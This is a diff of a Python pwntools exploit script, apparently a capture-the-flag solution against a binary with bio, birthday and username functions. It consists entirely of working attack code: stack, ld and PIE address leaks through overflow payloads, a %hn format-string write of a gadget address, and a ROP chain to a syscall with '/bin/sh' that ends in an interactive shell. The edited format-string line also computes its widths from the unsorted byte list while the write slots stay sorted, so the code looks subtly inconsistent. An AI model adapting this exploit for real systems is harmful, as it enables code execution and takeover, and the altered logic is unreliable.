@@ -97,14 +97,13 @@ def main():
     global r
     r = conn()
     
-    # Main stack leak
-    payload = 'A'*(96-40) + 'B'*6
+    # Stack leak
+    payload = 'A'*56 + 'B'*6 # 62 total
     
     #pause()
-    setBio(payload)
-    #pause()
+    setBio(payload) # will add a \n, total 63.
+
     leak = showInfo().split(b'\n')
-    
     stack_leak  = u64(leak[-1].ljust(8, b'\0'))
     struct_adr  = stack_leak - 0x9f
     date_adr    = struct_adr + 9
@@ -121,10 +120,10 @@ def main():
     #pause()
     
     # LD Leak
-    payload = 'A'*(104-40) + 'B'*6
+    payload = 'A'*64 + 'B'*6
     setBio(payload)
+
     leak = showInfo().split(b'\n')
-    
     ld_leak = u64(leak[-1].ljust(8, b'\0'))
     ld_base = ld_leak - 0x19da7
     
@@ -134,11 +133,10 @@ def main():
     print()
     
     # PIE Leak
-    payload = 'A'*(345-40) + 'B'*6
+    payload = 'A'*305 + 'B'*6
     setBio(payload)
-    # r.interactive()
+
     leak = showInfo().split(b'\n')
-    
     pie_leak = u64(leak[-1].ljust(8, b'\0'))
     pie_base = (pie_leak - 0x10) << 8
     
@@ -150,23 +148,23 @@ def main():
     pause()
     
     # ROP Gads
-    POP_5_RET           = ld_base + 0x000000000001d085 # add rsp, 0x110; mov eax, r12d; pop r12; ret;
+    ADD_RSP_RET         = ld_base + 0x000000000001d085 # add rsp, 0x110; mov eax, r12d; pop r12; ret;
     SYSCALL             = ld_base + 0x0000000000001a97 # syscall;
     POP_RDI             = ld_base + 0x000000000000118d # pop rdi; ret;
     POP_RSI             = ld_base + 0x0000000000001d28 # pop rsi; ret;
     POP_RAX_RDX_RBX     = ld_base + 0x00000000000011ce # pop rax; pop rdx; pop rbx; ret;
     
     # Prepare for format string write
-    POP_5_BYTES = [POP_5_RET&0xffff, ((POP_5_RET) >> 16) & 0xffff, ((POP_5_RET) >> 32) & 0xffff]
-    POP_5_BYTES_sorted = list(POP_5_BYTES)
-    POP_5_BYTES_sorted.sort()
+    ADD_RSP_RET_BYTES = [ADD_RSP_RET&0xffff, ((ADD_RSP_RET) >> 16) & 0xffff, ((ADD_RSP_RET) >> 32) & 0xffff]
+    ADD_RSP_RET_BYTES_sorted = list(ADD_RSP_RET_BYTES)
+    ADD_RSP_RET_BYTES_sorted.sort()
     
-    logh('Gadget', POP_5_RET)
-    log('Gadget bytes', list(map(hex, POP_5_BYTES)))
+    logh('Gadget', ADD_RSP_RET)
+    log('Gadget bytes', list(map(hex, ADD_RSP_RET_BYTES)))
     
     # Format String payload
     payload = b'\0'
-    payload += '%{}x%61$hn%{}x%60$hn%{}x%59$hn'.format(POP_5_BYTES_sorted[0]-1, POP_5_BYTES_sorted[1]-POP_5_BYTES_sorted[0], POP_5_BYTES_sorted[2]-POP_5_BYTES_sorted[1]).encode()
+    payload += '%{}x%61$hn%{}x%60$hn%{}x%59$hn'.format(ADD_RSP_RET_BYTES[0]-1, ADD_RSP_RET_BYTES[1]-ADD_RSP_RET_BYTES[0], ADD_RSP_RET_BYTES[2]-ADD_RSP_RET_BYTES[1]).encode()
     
     setBirthday(payload)
 
@@ -181,12 +179,12 @@ def main():
     
     payload = b"/bin/sh\0" + b"\x90"*207 # Padding
     payload += rop_chain
-    payload += b"\x98"*(112 - len(rop_chain))
+    payload += b"\x98"*(112 - len(rop_chain)) # Padding
     
     # Used by format string payload
-    payload += p64(ret_adr + 2*POP_5_BYTES.index(POP_5_BYTES_sorted[2])) # 59
-    payload += p64(ret_adr + 2*POP_5_BYTES.index(POP_5_BYTES_sorted[1])) # 60
-    payload += p64(ret_adr + 2*POP_5_BYTES.index(POP_5_BYTES_sorted[0])) # 61
+    payload += p64(ret_adr + 2*ADD_RSP_RET_BYTES.index(ADD_RSP_RET_BYTES_sorted[2])) # 59
+    payload += p64(ret_adr + 2*ADD_RSP_RET_BYTES.index(ADD_RSP_RET_BYTES_sorted[1])) # 60
+    payload += p64(ret_adr + 2*ADD_RSP_RET_BYTES.index(ADD_RSP_RET_BYTES_sorted[0])) # 61
     payload += p64(date_adr) # used by setUName payload
     
     setBio(payload)
@@ -194,6 +192,7 @@ def main():
     payload = ".%96$hhn"
     log('SetUName', setUName(payload))
     
+    pause()
     showInfo(True)
     
     r.interactive()
